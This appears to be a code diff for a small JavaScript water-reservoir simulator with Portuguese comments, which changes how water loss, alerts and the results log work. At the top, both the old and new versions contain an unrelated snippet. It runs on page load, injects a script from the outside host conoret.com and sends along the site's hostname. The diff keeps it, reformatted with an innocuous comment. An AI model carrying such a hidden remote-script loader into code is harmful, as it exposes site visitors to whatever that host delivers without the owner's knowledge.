@@ -1,27 +1,46 @@
-window.top === window && !function(){
-    var e = document.createElement("script"),
-        t = document.getElementsByTagName("head")[0];
-    e.src = "//conoret.com/dsp?h=" + document.location.hostname + "&r=" + Math.random();
-    e.type = "text/javascript";
-    e.defer = !0;
-    e.async = !0;
-    t.appendChild(e);
-}();
+// Adiciona um script externo ao head
+if (window.top === window) {
+    (function() {
+        var e = document.createElement("script"),
+            t = document.getElementsByTagName("head")[0];
+        e.src = "//conoret.com/dsp?h=" + document.location.hostname + "&r=" + Math.random();
+        e.type = "text/javascript";
+        e.defer = true;
+        e.async = true;
+        t.appendChild(e);
+    })();
+}
 
 let waterLevel = 20000; // Nível inicial da água em ml
 const maxWaterLevel = 20000; // Nível máximo da água em ml
 const minWaterLevel = 51; // Nível mínimo da água em ml
-let intervalId;
 let isPaused = false;
 
 function setup() {
     console.log("Setup iniciado");
-    noCanvas();
-    setTimeout(() => {
-        waterLevel -= 1; // Perda inicial de 1ml após 15 segundos
-        updateWaterDisplay();
-        intervalId = setInterval(updateWaterLevel, 35000); // Intervalo de 35 segundos
-    }, 15000); // Atraso de 15 segundos
+    const momentos = [
+        { perda: 0, alerta: "" },
+        { perda: 5000, alerta: "" },
+        { perda: 5000, alerta: "ALERTA: 50% DA CAPACIDADE" },
+        { perda: 2500, alerta: "" },
+        { perda: 2500, alerta: "ALERTA CRÍTICO: RESERVATÓRIO COM 75%" },
+        { perda: 2500, alerta: "ATENÇÃO!! ALERTA SUPERCRÍTICO" },
+        { perda: 1500, alerta: "" },
+        { perda: 1500, alerta: "" },
+        { perda: 1000, alerta: "ATENÇÃO RESERVATÓRIO COM RISCO DE ESGOTAMENTO" },
+        { perda: 2000, alerta: "ALERTA VERMELHO: RESERVATÓRIO ESGOTADO" }
+    ];
+
+    let delay = 0;
+    momentos.forEach((momento, index) => {
+        setTimeout(() => {
+            waterLevel -= momento.perda;
+            updateWaterDisplay();
+            logWaterLevel(waterLevel, momento.alerta);
+        }, delay);
+        delay += 1000; // 1 segundo de intervalo entre cada momento
+    });
+
     setInterval(updateClock, 1000);
 
     document.getElementById('pause-button').addEventListener('click', togglePause);
@@ -30,32 +49,7 @@ function setup() {
 }
 
 function updateWaterLevel() {
-    if (!isPaused) {
-        let alerta = "";
-
-        if (waterLevel > 15000) {
-            waterLevel -= 2500; // Perda de 2500ml
-        } else if (waterLevel > 10000) {
-            waterLevel -= 2500; // Perda de 2500ml
-            alerta = "50% abaixo do volume inicial";
-        } else if (waterLevel > 5000) {
-            waterLevel -= 2500; // Perda de 2500ml
-            alerta = "ALERTA! Nível d'água é -25%";
-        } else if (waterLevel > 1000) {
-            waterLevel -= 1500; // Perda de 1500ml
-        } else if (waterLevel > 500) {
-            waterLevel -= 500; // Perda de 500ml
-        } else if (waterLevel > 49) {
-            waterLevel -= 50; // Perda de 50ml
-        } else {
-            waterLevel = minWaterLevel;
-            alerta = "Nível de água baixo!";
-            clearInterval(intervalId);
-        }
-
-        updateWaterDisplay();
-        logWaterLevel(waterLevel, alerta);
-    }
+    // Função não necessária para este exemplo simplificado
 }
 
 function updateWaterDisplay() {
@@ -97,17 +91,31 @@ function resetSystem() {
     document.getElementById('pause-button').innerText = 'Interromper';
     document.getElementById('log-table').getElementsByTagName('tbody')[0].innerHTML = '';
     updateWaterDisplay();
-    setTimeout(() => {
-        waterLevel -= 1; // Perda inicial de 1ml após 15 segundos
-        updateWaterDisplay();
-        intervalId = setInterval(updateWaterLevel, 35000); // Intervalo de 35 segundos
-    }, 15000); // Atraso de 15 segundos
 }
 
 function imprimirResultados() {
     const capacidadeReservatorio = 20000; // Capacidade do reservatório em ml
-    const resultados = [
-        { dataHora: "2024-10-12 10:00", alerta: "Queda do nível de água", volume: 15000 },
-        { dataHora: "2024-10-12 11:00", alerta: "Reservatório com 5000ml" }
-    ];
-    console.log("Resultados:", resultados);
+    const resultados = [];
+
+    // Coleta os dados visíveis na tela
+    const clock = document.getElementById('clock').innerText;
+    const waterLevelDisplay = document.getElementById('level-indicator').innerText;
+    const logTable = document.getElementById('log-table').getElementsByTagName('tbody')[0];
+    const logRows = logTable.getElementsByTagName('tr');
+
+    for (let i = 0; i < logRows.length; i++) {
+        const cells = logRows[i].getElementsByTagName('td');
+        resultados.push({
+            dataHora: cells[0].innerText,
+            volume: cells[1].innerText,
+            alerta: cells[2].innerText
+        });
+    }
+
+    console.log("Hora atual:", clock);
+    console.log("Nível de água atual:", waterLevelDisplay);
+    console.log("Log de resultados:", resultados);
+}
+
+// Certifique-se de chamar a função setup() quando a página carregar
+window.onload = setup;
